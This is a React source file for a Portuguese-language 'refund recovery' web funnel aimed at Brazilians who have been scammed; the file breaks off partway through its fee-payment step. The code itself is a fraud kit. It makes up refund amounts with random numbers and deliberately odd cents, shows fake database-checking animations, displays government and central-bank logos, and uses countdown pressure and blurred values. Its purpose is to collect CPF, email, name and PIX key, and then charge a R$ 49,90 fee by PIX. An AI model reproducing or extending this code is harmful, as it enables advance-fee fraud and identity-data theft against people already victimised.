import { useState, useEffect, useRef, useCallback } from "react";
import { ArrowLeft, X, LayoutGrid, FileText, RefreshCw, Clock, UserCircle2, Copy, Check } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";

// ─── constants ────────────────────────────────────────────────────────────────

const TAXA_DISPLAY = "R$ 49,90";

const SCAM_TYPES = [
    "Golpe no PIX",
    "Fraude em Marketplace",
    "Compra não entregue",
    "Site falso / Phishing",
    "Golpe de Investimento",
    "Golpe no WhatsApp",
    "Aplicativo Falso",
    "Curso / Mentoria não entregue",
    "Assinatura indevida",
    "Outros",
];

const EMAIL_DOMAINS = [
    "@gmail.com",
    "@hotmail.com",
    "@outlook.com",
    "@yahoo.com",
    "@icloud.com",
    "@live.com",
];

const LOADING_STEPS = [
    { pct: 0,   text: "Verificando seu CPF na base de dados nacional..." },
    { pct: 18,  text: "Cruzando dados com marketplaces e lojas virtuais..." },
    { pct: 34,  text: "Consultando histórico de transferências PIX..." },
    { pct: 50,  text: "Verificando registros de pagamentos digitais..." },
    { pct: 65,  text: "Analisando histórico de compras online..." },
    { pct: 78,  text: "Calculando correção monetária e juros..." },
    { pct: 90,  text: "Consolidando reembolsos identificados..." },
    { pct: 100, text: "Análise concluída!" },
];

const CATEGORIES = [
    {
        icon: "🛒",
        label: "COMPRAS & VENDAS ONLINE",
        tags: ["Marketplaces", "Lojas Virtuais", "E-commerce", "Sites de Oferta", "Anúncios Online"],
    },
    {
        icon: "💎",
        label: "PRODUTOS & SERVIÇOS DIGITAIS",
        tags: ["Cursos Online", "Mentorias", "Assinaturas", "Apps Digitais", "Plataformas"],
    },
    {
        icon: "🇧🇷",
        label: "PAGAMENTOS & TRANSFERÊNCIAS",
        tags: ["Gateways", "Carteiras Digitais", "Transferências Pix", "Investimentos", "Apostas Online"],
    },
];

const TAG_THRESHOLDS = {
    "Marketplaces": 5,    "Lojas Virtuais": 11,   "E-commerce": 17,
    "Sites de Oferta": 23, "Anúncios Online": 29,
    "Cursos Online": 36,  "Mentorias": 42,        "Assinaturas": 48,
    "Apps Digitais": 54,  "Plataformas": 60,
    "Gateways": 67,       "Carteiras Digitais": 73, "Transferências Pix": 79,
    "Investimentos": 85,  "Apostas Online": 91,
};

const PIX_KEY_TYPES = [
    { value: "CPF",       label: "CPF",            placeholder: "000.000.000-00" },
    { value: "email",     label: "E-mail",          placeholder: "seuemail@gmail.com" },
    { value: "telefone",  label: "Telefone",        placeholder: "(11) 99999-9999" },
    { value: "aleatoria", label: "Chave Aleatória", placeholder: "Informe sua chave" },
];

// ─── helpers ──────────────────────────────────────────────────────────────────

function formatCPF(raw) {
    return raw
        .replace(/\D/g, "")
        .slice(0, 11)
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
        .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
}

function formatPhone(raw) {
    const d = raw.replace(/\D/g, "").slice(0, 11);
    if (d.length <= 2) return d;
    if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
    if (d.length <= 10) return `(${d.slice(0, 2)}) ${d.slice(2, 6)}-${d.slice(6)}`;
    return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
}

function digitsToDisplay(digits) {
    if (!digits) return "";
    const num = parseInt(digits, 10) / 100;
    return `R$ ${num.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
}

function isValidCPF(digits) {
    if (digits.length !== 11 || /^(\d)\1+$/.test(digits)) return false;
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(digits[i]) * (10 - i);
    let r = (sum * 10) % 11;
    if (r === 10 || r === 11) r = 0;
    if (r !== parseInt(digits[9])) return false;
    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(digits[i]) * (11 - i);
    r = (sum * 10) % 11;
    if (r === 10 || r === 11) r = 0;
    return r === parseInt(digits[10]);
}

function toTitleCase(str) {
    const small = ["da", "de", "do", "das", "dos", "e", "e"];
    return str.toLowerCase().split(" ").map((w, i) =>
        i === 0 || !small.includes(w) ? w.charAt(0).toUpperCase() + w.slice(1) : w
    ).join(" ");
}

function generateAmounts(rawDigits) {
    const base = rawDigits ? parseInt(rawDigits, 10) / 100 : 500;
    let raw = base * (1.65 + Math.random() * 0.75);
    if (raw < 950) raw = 950 + Math.random() * 350;

    // Broken cents — odd numbers, never .00/.50/round
    const ODD_CENTS = [7,13,17,19,23,27,29,31,37,39,41,43,47,53,57,59,61,63,67,69,71,73,77,79,81,83,87,89,91,93,97,99];
    const pick = () => ODD_CENTS[Math.floor(Math.random() * ODD_CENTS.length)];

    const intTotal = Math.floor(raw);
    const a1Int = Math.floor(intTotal * (0.55 + Math.random() * 0.1));
    const a2Int = intTotal - a1Int;

    const fmt = (n) => n.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    return {
        a1:    fmt(a1Int    + pick() / 100),
        a2:    fmt(a2Int    + pick() / 100),
        total: fmt(intTotal + pick() / 100),
    };
}

// ─── logos oficiais ───────────────────────────────────────────────────────────

function LogosOficiais() {
    return (
        <img
            src="/logos-oficiais.png"
            alt="Banco Central · gov.br · Receita Federal"
            className="h-6 w-auto object-contain opacity-80"
            loading="lazy"
        />
    );
}

function useCountUp(targetStr, duration = 1800) {
    const [display, setDisplay] = useState("0,00");
    useEffect(() => {
        const target = parseFloat(String(targetStr).replace(/\./g, "").replace(",", "."));
        if (!target || isNaN(target)) return;
        const start = Date.now();
        let raf;
        const tick = () => {
            const elapsed = Date.now() - start;
            const progress = Math.min(elapsed / duration, 1);
            const eased = 1 - Math.pow(1 - progress, 3);
            setDisplay((target * eased).toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
            if (progress < 1) { raf = requestAnimationFrame(tick); }
        };
        raf = requestAnimationFrame(tick);
        return () => cancelAnimationFrame(raf);
    }, [targetStr, duration]);
    return display;
}

// ─── shared layout ────────────────────────────────────────────────────────────

function ModalCard({ children, onBackdropClick }) {
    return (
        <div
            className="fixed inset-0 z-[60] flex sm:items-center sm:justify-center sm:p-4"
            style={{ backgroundColor: "rgba(0,0,0,0.88)", backdropFilter: "blur(6px)" }}
            onClick={onBackdropClick}
        >
            <div
                className="relative w-full h-full sm:h-auto sm:max-w-md sm:max-h-[90vh] flex flex-col sm:rounded-2xl overflow-hidden"
                style={{
                    backgroundColor: "#0a150e",
                    border: "1px solid #1e3a26",
                }}
                onClick={(e) => e.stopPropagation()}
            >
                {children}
            </div>
        </div>
    );
}

const NAV_ITEMS = [
    { label: "Painel",     Icon: LayoutGrid  },
    { label: "Reembolsos", Icon: FileText    },
    { label: "Consulta",   Icon: RefreshCw   },
    { label: "Solicitar",  Icon: Clock       },
    { label: "Dados",      Icon: UserCircle2 },
];

function BottomNav({ activeIndex = 2 }) {
    return (
        <div
            className="flex-shrink-0 border-t border-zinc-800/80"
            style={{ backgroundColor: "#080f09" }}
        >
            <div className="flex items-center justify-around px-1 py-2 pb-3">
                {NAV_ITEMS.map(({ label, Icon }, i) => {
                    const active = i === activeIndex;
                    return (
                        <button key={label} className="flex flex-col items-center gap-1 min-w-[52px]">
                            {active ? (
                                <div className="w-12 h-12 rounded-full bg-[#00FF66] flex items-center justify-center shadow-[0_0_16px_rgba(0,255,102,0.5)] mb-0.5">
                                    <Icon className="w-5 h-5 text-black" strokeWidth={2.5} />
                                </div>
                            ) : (
                                <div className="w-8 h-8 flex items-center justify-center">
                                    <Icon className="w-5 h-5 text-zinc-600" strokeWidth={1.5} />
                                </div>
                            )}
                            <span className={`text-[9px] font-medium leading-none ${active ? "text-[#00FF66]" : "text-zinc-600"}`}>
                                {label}
                            </span>
                        </button>
                    );
                })}
            </div>
        </div>
    );
}

// ─── step 1: form ─────────────────────────────────────────────────────────────

function StepForm({ onSubmit, onClose }) {
    const [email, setEmail]             = useState("");
    const [cpf, setCpf]                 = useState("");
    const [tipoGolpe, setTipoGolpe]     = useState("");
    const [valorDigits, setValorDigits] = useState("");
    const [suggestions, setSuggestions] = useState([]);
    const [cpfData, setCpfData]         = useState(null);
    const [cpfStatus, setCpfStatus]     = useState("idle"); // idle | loading | found | error
    const emailRef = useRef(null);

    const cpfDigits = cpf.replace(/\D/g, "");

    useEffect(() => {
        if (cpfDigits.length !== 11) {
            setCpfData(null);
            setCpfStatus("idle");
            return;
        }
        if (!isValidCPF(cpfDigits)) {
            setCpfData(null);
            setCpfStatus("invalid");
            return;
        }
        setCpfStatus("loading");
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 8000);
        fetch(`/api/cpf/${cpfDigits}`, {
            headers: { "Accept": "application/json" },
            signal: controller.signal,
        })
            .then((r) => { clearTimeout(timer); return r.json(); })
            .then((data) => {
                if (data?.NOME) {
                    setCpfData(data);
                    setCpfStatus("found");
                } else {
                    setCpfStatus("error");
                }
            })
            .catch(() => { clearTimeout(timer); setCpfStatus("error"); });
    }, [cpfDigits]);

    const handleEmailChange = (val) => {
        setEmail(val);
        if (!val) { setSuggestions([]); return; }
        const atIdx = val.indexOf("@");
        if (atIdx === -1) {
            setSuggestions(EMAIL_DOMAINS.map((d) => val + d));
        } else {
            const typed = val.slice(atIdx);
            const matches = EMAIL_DOMAINS
                .filter((d) => d.startsWith(typed) && d !== typed)
                .map((d) => val.slice(0, atIdx) + d);
            setSuggestions(matches);
        }
    };

    const handleValorChange = (e) => {
        const digits = e.target.value.replace(/\D/g, "").slice(0, 10);
        setValorDigits(digits);
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        onSubmit({ email, cpf, tipoGolpe, valorDigits, cpfData });
    };

    const inputStyle = { backgroundColor: "#0a1a0f", border: "1px solid #1e3a26" };

    return (
        <ModalCard onBackdropClick={onClose}>
            <button
                onClick={onClose}
                className="absolute top-4 right-4 text-zinc-500 hover:text-white transition-colors z-10"
                aria-label="Fechar"
            >
                <X className="w-5 h-5" />
            </button>

            <div className="overflow-y-auto p-6">
                <h2 className="font-display text-white text-xl font-bold text-center mb-1">
                    Faça sua consulta gratuita
                </h2>
                <p className="text-zinc-400 text-sm text-center mb-6">
                    Preencha abaixo e descubra quanto você pode recuperar
                </p>

                <form onSubmit={handleSubmit} className="flex flex-col gap-4">
                    <div className="relative" ref={emailRef}>
                        <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">
                            E-mail usado nas compras online
                        </label>
                        <input
                            type="text"
                            inputMode="email"
                            value={email}
                            onChange={(e) => handleEmailChange(e.target.value)}
                            onBlur={() => setTimeout(() => setSuggestions([]), 150)}
                            placeholder="seuemail@gmail.com"
                            required
                            className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
                            style={inputStyle}
                        />
                        {suggestions.length > 0 && (
                            <ul
                                className="absolute left-0 right-0 z-20 mt-1 rounded-xl overflow-hidden"
                                style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}
                            >
                                {suggestions.map((s) => (
                                    <li key={s}>
                                        <button
                                            type="button"
                                            onMouseDown={() => { setEmail(s); setSuggestions([]); }}
                                            className="w-full text-left px-4 py-2.5 text-sm text-zinc-300 hover:bg-[#00FF66]/10 hover:text-white transition-colors"
                                        >
                                            {s}
                                        </button>
                                    </li>
                                ))}
                            </ul>
                        )}
                    </div>

                    <div>
                        <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">CPF</label>
                        <input
                            type="text"
                            value={cpf}
                            onChange={(e) => setCpf(formatCPF(e.target.value))}
                            placeholder="000.000.000-00"
                            required
                            inputMode="numeric"
                            className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
                            style={{
                                ...inputStyle,
                                borderColor: cpfStatus === "found"   ? "rgba(0,255,102,0.5)"
                                           : cpfStatus === "invalid" ? "rgba(239,68,68,0.6)"
                                           : "#1e3a26",
                            }}
                        />
                        {cpfStatus === "loading" && (
                            <p className="mt-1.5 text-[11px] text-zinc-500 flex items-center gap-1.5">
                                <span className="w-2 h-2 rounded-full bg-zinc-500 animate-pulse inline-block" />
                                Verificando CPF...
                            </p>
                        )}
                        {cpfStatus === "invalid" && (
                            <p className="mt-1.5 text-[11px] text-red-400 flex items-center gap-1.5">
                                ✕ CPF inválido — verifique e tente novamente
                            </p>
                        )}
                        {cpfStatus === "found" && (
                            <p className="mt-1.5 text-[11px] text-[#00FF66] flex items-center gap-1.5">
                                ✓ Dados encontrados — campos serão preenchidos automaticamente
                            </p>
                        )}
                    </div>

                    <div>
                        <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">
                            Tipo de golpe sofrido
                        </label>
                        <div className="relative">
                            <select
                                value={tipoGolpe}
                                onChange={(e) => setTipoGolpe(e.target.value)}
                                required
                                className="w-full rounded-xl px-4 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50 appearance-none"
                                style={{ ...inputStyle, color: tipoGolpe ? "#fff" : "#52525b" }}
                            >
                                <option value="" disabled>Selecione...</option>
                                {SCAM_TYPES.map((t) => (
                                    <option key={t} value={t} style={{ color: "#fff" }}>{t}</option>
                                ))}
                            </select>
                            <div className="pointer-events-none absolute right-4 top-1/2 -translate-y-1/2 text-[#00FF66] text-xs">▼</div>
                        </div>
                    </div>

                    <div>
                        <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">
                            Valor aproximado perdido (R$)
                        </label>
                        <input
                            type="text"
                            value={digitsToDisplay(valorDigits)}
                            onChange={handleValorChange}
                            placeholder="R$ 0,00"
                            required
                            inputMode="numeric"
                            className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
                            style={inputStyle}
                        />
                    </div>

                    <button
                        type="submit"
                        className="mt-2 w-full py-4 rounded-xl font-bold text-black text-base tracking-tight transition-all duration-200 hover:brightness-110 active:scale-[0.98]"
                        style={{ backgroundColor: "#00FF66" }}
                    >
                        🔍 CONSULTAR MEU REEMBOLSO
                    </button>
                </form>

                <p className="mt-4 text-center text-xs text-zinc-600">
                    🔒 Dados protegidos com SSL · Nunca compartilhados
                </p>
            </div>
        </ModalCard>
    );
}

// ─── step 2: loading ──────────────────────────────────────────────────────────

const TOTAL_DURATION = 11000;

function StepLoading({ onComplete }) {
    const [progress, setProgress] = useState(0);
    const startRef = useRef(Date.now());
    const rafRef   = useRef(null);

    const tick = useCallback(() => {
        const elapsed = Date.now() - startRef.current;
        const pct = Math.min((elapsed / TOTAL_DURATION) * 100, 100);
        setProgress(pct);
        if (pct < 100) {
            rafRef.current = requestAnimationFrame(tick);
        } else {
            setTimeout(onComplete, 600);
        }
    }, [onComplete]);

    useEffect(() => {
        rafRef.current = requestAnimationFrame(tick);
        return () => cancelAnimationFrame(rafRef.current);
    }, [tick]);

    const currentMsg =
        [...LOADING_STEPS].reverse().find((s) => progress >= s.pct)?.text ?? LOADING_STEPS[0].text;

    const R = 60;
    const circ = 2 * Math.PI * R;
    const offset = circ - (progress / 100) * circ;

    const activeTag = Object.entries(TAG_THRESHOLDS)
        .filter(([, t]) => progress >= t)
        .sort((a, b) => b[1] - a[1])[0]?.[0] ?? null;

    return (
        <ModalCard>
            <div className="flex-shrink-0 px-5 pt-5 pb-3 text-center">
                <h2 className="font-display text-white text-lg font-bold mb-0.5">Consulta de Reembolsos</h2>
                <p className="text-zinc-400 text-xs">Cruzando dados em múltiplos canais...</p>
            </div>

            <div className="flex-1 overflow-y-auto px-4 pb-3">
                {CATEGORIES.map(({ icon, label, tags }) => (
                    <div key={label} className="mb-4">
                        <p className="text-[9px] font-semibold tracking-[0.15em] text-zinc-500 text-center mb-2 uppercase">
                            {icon} {label}
                        </p>
                        <div className="flex flex-wrap justify-center gap-1.5">
                            {tags.map((tag) => {
                                const threshold = TAG_THRESHOLDS[tag] ?? 100;
                                const scanned = progress >= threshold;
                                const isActive = tag === activeTag;
                                return (
                                    <span
                                        key={tag}
                                        className="px-2.5 py-1 rounded-full text-xs border transition-all duration-500"
                                        style={
                                            isActive
                                                ? { backgroundColor: "rgba(0,255,102,0.18)", borderColor: "#00FF66", color: "#00FF66", boxShadow: "0 0 8px rgba(0,255,102,0.35)" }
                                                : scanned
                                                ? { backgroundColor: "rgba(0,255,102,0.07)", borderColor: "rgba(0,255,102,0.3)", color: "#a3e6bc" }
                                                : { backgroundColor: "#111d15", borderColor: "#3f3f46", color: "#71717a" }
                                        }
                                    >
                                        {scanned && !isActive && <span className="mr-1 text-[9px]">✓</span>}
                                        {isActive && <span className="mr-1 inline-block w-1.5 h-1.5 rounded-full bg-[#00FF66] animate-pulse align-middle" />}
                                        {tag}
                                    </span>
                                );
                            })}
                        </div>
                    </div>
                ))}

                <div className="flex flex-col items-center mt-4 mb-4">
                    <div className="relative w-[150px] h-[150px]">
                        <svg className="w-full h-full" viewBox="0 0 150 150" style={{ transform: "rotate(-90deg)" }}>
                            <circle cx="75" cy="75" r={R} fill="none" stroke="#1a2e20" strokeWidth="7" />
                            <circle
                                cx="75" cy="75" r={R}
                                fill="none" stroke="#00FF66" strokeWidth="7" strokeLinecap="round"
                                strokeDasharray={circ} strokeDashoffset={offset}
                                style={{ filter: "drop-shadow(0 0 6px rgba(0,255,102,0.6))" }}
                            />
                        </svg>
                        <div className="absolute inset-0 flex items-center justify-center">
                            <span className="text-3xl font-bold text-white font-mono tabular-nums">
                                {Math.floor(progress)}%
                            </span>
                        </div>
                    </div>
                    <p className="mt-3 text-zinc-400 text-xs text-center px-4">{currentMsg}</p>
                </div>
            </div>

            <BottomNav activeIndex={2} />
        </ModalCard>
    );
}

// ─── step 3: results ──────────────────────────────────────────────────────────

function StepResults({ formData, onClose, onRegisterPix }) {
    const amounts = formData.amounts;
    const [expiry, setExpiry] = useState(48 * 3600);

    useEffect(() => {
        const id = setInterval(() => setExpiry(p => p > 0 ? p - 1 : 0), 1000);
        return () => clearInterval(id);
    }, []);

    const pad = (n) => String(n).padStart(2, "0");
    const expiryStr = `${pad(Math.floor(expiry / 3600))}:${pad(Math.floor((expiry % 3600) / 60))}:${pad(expiry % 60)}`;

    return (
        <ModalCard>
            <div className="flex-shrink-0 flex items-center gap-3 px-4 py-3 border-b border-zinc-800">
                <button onClick={onClose} className="text-zinc-400 hover:text-white transition-colors" aria-label="Fechar">
                    <ArrowLeft className="w-5 h-5" />
                </button>
                <div>
                    <h2 className="font-display text-white font-bold text-sm leading-tight">Reembolsos Pendentes</h2>
                    <p className="text-[#00FF66] text-xs leading-tight">Análise concluída com sucesso</p>
                </div>
            </div>

            <div className="flex-1 overflow-y-auto px-4 pt-3 pb-3">
                <div className="rounded-2xl p-4 mb-3" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <div className="flex flex-col items-center text-center">
                        <div className="w-14 h-14 rounded-full bg-[#00FF66] flex items-center justify-center mb-3 shadow-[0_0_24px_rgba(0,255,102,0.4)]">
                            <svg className="w-7 h-7 text-black" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                            </svg>
                        </div>
                        <h3 className="text-white font-bold text-lg mb-1">
                            ANÁLISE FEITA COM <span className="text-[#00FF66]">SUCESSO!</span>
                        </h3>
                        <p className="text-zinc-400 text-xs mb-3">Foi constatado, você tem</p>

                        <div className="w-full rounded-xl py-3 px-5 mb-2" style={{ backgroundColor: "#00FF66" }}>
                            <span className="font-bold text-2xl text-black" style={{ filter: "blur(3px)" }}>
                                R$ {amounts.total}
                            </span>
                        </div>
                        <p className="text-[#00FF66] text-xs mb-2">🔒 Valor oculto por segurança</p>
                        <p className="text-zinc-400 text-xs leading-relaxed">
                            de reembolsos pendentes referente às suas compras online.{" "}
                            <span className="text-white font-medium">Receba com juros e correções monetárias.</span>
                        </p>
                    </div>
                </div>

                {/* CTA — acima dos itens para visibilidade imediata */}
                <button
                    onClick={onRegisterPix}
                    className="flex items-center justify-center gap-2 w-full py-4 rounded-2xl font-bold text-black text-sm tracking-tight transition-all duration-200 hover:brightness-110 active:scale-[0.98] shadow-[0_0_24px_rgba(0,255,102,0.3)] mb-1"
                    style={{ backgroundColor: "#00FF66" }}
                >
                    💳 CADASTRAR CHAVE PIX E SACAR
                </button>
                <p className="text-center text-xs text-yellow-500 mb-3 font-mono tabular-nums">
                    ⚠ Valores expiram em <span className="font-bold">{expiryStr}</span> — Solicite agora
                </p>

                <div className="rounded-2xl p-3 mb-3 text-center" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <p className="text-white font-semibold text-xs mb-1">🔒 Empresas ocultas por segurança</p>
                    <p className="text-zinc-500 text-xs leading-relaxed">
                        Os nomes das empresas e valores exatos são revelados após o cadastro da sua chave PIX.
                    </p>
                </div>

                <div className="flex items-center justify-between mb-2">
                    <span className="text-[9px] font-bold tracking-[0.15em] text-zinc-400 uppercase">Reembolsos Identificados</span>
                    <span className="text-xs text-[#00FF66] font-semibold">2 pendentes</span>
                </div>

                {[{ icon: "📦", amount: amounts.a1 }, { icon: "🛒", amount: amounts.a2 }].map(({ icon, amount }, i) => (
                    <div key={i} className="rounded-2xl p-3 mb-2 flex items-center gap-3" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                        <div className="w-9 h-9 rounded-xl flex items-center justify-center text-base flex-shrink-0" style={{ backgroundColor: "#111d15" }}>
                            {icon}
                        </div>
                        <div className="flex-1 min-w-0">
                            <div className="flex items-center justify-between mb-1">
                                <span className="text-xs text-zinc-400" style={{ filter: "blur(3px)" }}>Empresa {i + 1} ••••••</span>
                                <span className="text-[9px] bg-yellow-900/40 text-yellow-400 px-1.5 py-0.5 rounded-full border border-yellow-700/50 flex-shrink-0 ml-2">🔒 OCULTO</span>
                            </div>
                            <div className="flex items-center justify-between">
                                <span className="font-bold text-sm text-[#00FF66]" style={{ filter: "blur(2.5px)" }}>R$ {amount}</span>
                                <span className="text-[10px] text-red-400 font-bold flex-shrink-0 ml-2 font-mono tabular-nums">
                                    VENCE EM {expiryStr}
                                </span>
                            </div>
                        </div>
                    </div>
                ))}

                <div className="rounded-2xl p-3 mt-1 flex items-center justify-between" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                    <span className="text-white text-sm font-semibold">Total disponível</span>
                    <span className="font-bold text-white text-sm" style={{ filter: "blur(2.5px)" }}>R$ {amounts.total}</span>
                </div>
            </div>

            <BottomNav activeIndex={1} />
        </ModalCard>
    );
}

// ─── step 4: pix key ──────────────────────────────────────────────────────────

function StepPixKey({ formData, onSubmit, onBack }) {
    const [nome, setNome]             = useState(
        formData?.cpfData?.NOME ? toTitleCase(formData.cpfData.NOME) : ""
    );
    const [nomeStatus, setNomeStatus] = useState(
        formData?.cpfData?.NOME ? "found" : "loading"
    );
    const [keyType, setKeyType]       = useState("CPF");
    const [keyValue, setKeyValue]     = useState(formData?.cpf || "");
    const [error, setError]           = useState("");

    // Fallback: busca nome se o form foi submetido antes da API responder
    useEffect(() => {
        if (formData?.cpfData?.NOME) { setNomeStatus("found"); return; }
        const digits = (formData?.cpf || "").replace(/\D/g, "");
        if (digits.length !== 11) { setNomeStatus("idle"); return; }
        setNomeStatus("loading");
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 8000);
        fetch(`/api/cpf/${digits}`, {
            headers: { "Accept": "application/json" },
            signal: controller.signal,
        })
            .then((r) => { clearTimeout(timer); return r.json(); })
            .then((data) => {
                if (data?.NOME) {
                    setNome(toTitleCase(data.NOME));
                    setNomeStatus("found");
                } else {
                    setNomeStatus("idle");
                }
            })
            .catch(() => { clearTimeout(timer); setNomeStatus("idle"); });
    }, []); // eslint-disable-line react-hooks/exhaustive-deps

    const selectedType = PIX_KEY_TYPES.find((k) => k.value === keyType);

    const handleKeyTypeChange = (val) => {
        setKeyType(val);
        if (val === "CPF") setKeyValue(formData?.cpf || "");
        else if (val === "email") setKeyValue(formData?.email || "");
        else setKeyValue("");
    };

    const handleKeyValueChange = (e) => {
        let v = e.target.value;
        if (keyType === "CPF") v = formatCPF(v);
        else if (keyType === "telefone") v = formatPhone(v);
        setKeyValue(v);
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        setError("");
        if (!nome.trim()) { setError("Informe seu nome completo."); return; }
        onSubmit({ nome: nome.trim(), keyType, keyValue });
    };

    const inputStyle = { backgroundColor: "#0a1a0f", border: "1px solid #1e3a26" };

    return (
        <ModalCard>
            <div className="flex-shrink-0 flex items-center gap-3 px-4 py-3 border-b border-zinc-800">
                <button onClick={onBack} className="text-zinc-400 hover:text-white transition-colors" aria-label="Voltar">
                    <ArrowLeft className="w-5 h-5" />
                </button>
                <div>
                    <h2 className="font-display text-white font-bold text-sm leading-tight">Cadastrar Chave PIX</h2>
                    <p className="text-[#00FF66] text-xs leading-tight">Informe onde receber o reembolso</p>
                </div>
            </div>

            <div className="flex-1 overflow-y-auto px-4 pt-4 pb-3">
                <form onSubmit={handleSubmit} className="flex flex-col gap-4">
                    <div>
                        <div className="flex items-center justify-between mb-1.5">
                            <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase">Nome completo</label>
                            {nomeStatus === "loading" && (
                                <span className="text-[9px] text-zinc-500 flex items-center gap-1">
                                    <span className="w-1.5 h-1.5 rounded-full bg-zinc-500 animate-pulse inline-block" />
                                    Buscando...
                                </span>
                            )}
                            {nomeStatus === "found" && (
                                <span className="text-[9px] font-semibold text-[#00FF66] bg-[#00FF66]/10 border border-[#00FF66]/25 px-1.5 py-0.5 rounded-full">
                                    ✓ Preenchido automaticamente
                                </span>
                            )}
                        </div>
                        <input
                            type="text"
                            value={nome}
                            onChange={(e) => setNome(e.target.value)}
                            placeholder={nomeStatus === "loading" ? "Buscando seu nome..." : "Seu nome completo"}
                            required
                            className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
                            style={{
                                ...inputStyle,
                                borderColor: nomeStatus === "found" ? "rgba(0,255,102,0.35)" : "#1e3a26",
                            }}
                        />
                    </div>

                    <div>
                        <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">Tipo de chave PIX</label>
                        <div className="grid grid-cols-2 gap-2">
                            {PIX_KEY_TYPES.map(({ value, label }) => (
                                <button
                                    key={value}
                                    type="button"
                                    onClick={() => handleKeyTypeChange(value)}
                                    className="py-2.5 px-3 rounded-xl text-xs font-semibold border transition-all"
                                    style={keyType === value
                                        ? { backgroundColor: "rgba(0,255,102,0.12)", borderColor: "#00FF66", color: "#00FF66" }
                                        : { backgroundColor: "#0a1a0f", borderColor: "#1e3a26", color: "#71717a" }
                                    }
                                >
                                    {label}
                                </button>
                            ))}
                        </div>
                    </div>

                    <div>
                        <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase mb-1.5">
                            Chave PIX ({selectedType?.label})
                        </label>
                        <input
                            type={keyType === "email" ? "email" : "text"}
                            value={keyValue}
                            onChange={handleKeyValueChange}
                            placeholder={selectedType?.placeholder}
                            required
                            inputMode={keyType === "CPF" || keyType === "telefone" ? "numeric" : "text"}
                            className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
                            style={inputStyle}
                        />
                    </div>

                    <div className="rounded-xl p-3" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                        <p className="text-zinc-400 text-xs leading-relaxed">
                            🔒 Sua chave PIX é usada apenas para{" "}
                            <span className="text-white font-medium">receber o reembolso</span>.
                            Nunca pedimos senha ou acesso ao seu banco.
                        </p>
                    </div>

                    {error && <p className="text-red-400 text-xs text-center -mt-1">{error}</p>}

                    <button
                        type="submit"
                        className="mt-1 w-full py-4 rounded-xl font-bold text-black text-base tracking-tight transition-all duration-200 hover:brightness-110 active:scale-[0.98]"
                        style={{ backgroundColor: "#00FF66" }}
                    >
                        ✓ CONFIRMAR CHAVE PIX
                    </button>
                </form>
            </div>

            <BottomNav activeIndex={4} />
        </ModalCard>
    );
}

// ─── step 5: taxa ─────────────────────────────────────────────────────────────

const CHECK = (
    <svg className="w-3.5 h-3.5 text-black" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
    </svg>
);

function StepTaxa({ formData, pixKeyData, onPay, onBack }) {
    const [loading, setLoading] = useState(false);
    const [error, setError]     = useState("");
    const amounts    = formData.amounts;
    const countedVal = useCountUp(amounts?.total || "0,00");

    const handlePay = async () => {
        setLoading(true);
        setError("");
        try {
            const utm = window.location.search.replace(/^\?/, "");
            const res = await fetch("/api/pix/create", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    name: pixKeyData.nome,
                    document: formData.cpf.replace(/\D/g, ""),
                    email: formData.email,
                    utm,
                }),
            });
            const data = await res.json();
            if (!res.ok) throw new Error(data.error || "Erro ao gerar pagamento");
            onPay(data);
        } catch (e) {
            setError(e.message || "Erro de conexão. Tente novamente.");
        } finally {
            setLoading(false);
        }
    };

    return (
        <ModalCard>
            <div className="flex-shrink-0 flex items-center gap-3 px-4 py-3 border-b border-zinc-800">
                <button onClick={onBack} className="text-zinc-400 hover:text-white transition-colors" aria-label="Voltar">
                    <ArrowLeft className="w-5 h-5" />
                </button>
                <div>
